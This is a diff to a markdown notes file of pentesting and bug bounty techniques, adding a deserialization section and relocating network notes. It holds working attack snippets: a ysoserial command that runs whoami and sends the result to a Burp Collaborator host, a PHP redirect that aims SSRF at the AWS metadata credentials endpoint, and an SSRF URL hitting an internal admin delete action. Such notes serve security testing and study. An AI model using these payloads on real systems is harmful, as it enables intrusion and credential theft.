@@ -18,6 +18,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Directory Traversal](#directory-traversal)
 - [Business logic vulnerabilities](#business-logic-vulnerabilities)
 - [CORS](#cors)
+- [Deserialization](#deserialization)
 - [DLL Hijacking](#dll-hijacking)
 - [GraphQL](#graphql)
 - [WordPress](#wordpress)
@@ -116,14 +117,7 @@ Cool extensions:
 - [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
 - [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
 - [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
-
-#### Ysoserial
-
-Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:
-
-```
-java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
-```
+- [Wsdler](https://github.com/NetSPI/Wsdler) to interact with SOAP
 
 ### XSS
 
@@ -221,11 +215,9 @@ SRF with whitelist-based input filters bypass
 
 By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
 
-### Network
-```
-ip route add <net_address_in_cdr> via <interface_gateway>
-route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
-nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
+For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
+```PHP
+<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
 ```
 
 ### Authentication vulnerabilities
@@ -315,6 +307,18 @@ CORS vulnerability with trusted insecure protocols
 </script>
 ```
 
+### Deserialization
+
+**Ysoserial**
+
+Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:
+
+```
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
+```
+
+[PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.
+
 ### DLL Hijacking
 
 Using Process Monitor (you can find it in the section [Tools](#tools)) set the filters to find missing dlls.<br/><br/>
@@ -399,6 +403,13 @@ More here: https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologi
   ```
 
 Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services
+
+### Network
+```
+ip route add <net_address_in_cdr> via <interface_gateway>
+route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
+nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
+```
 
 ### Linux
 
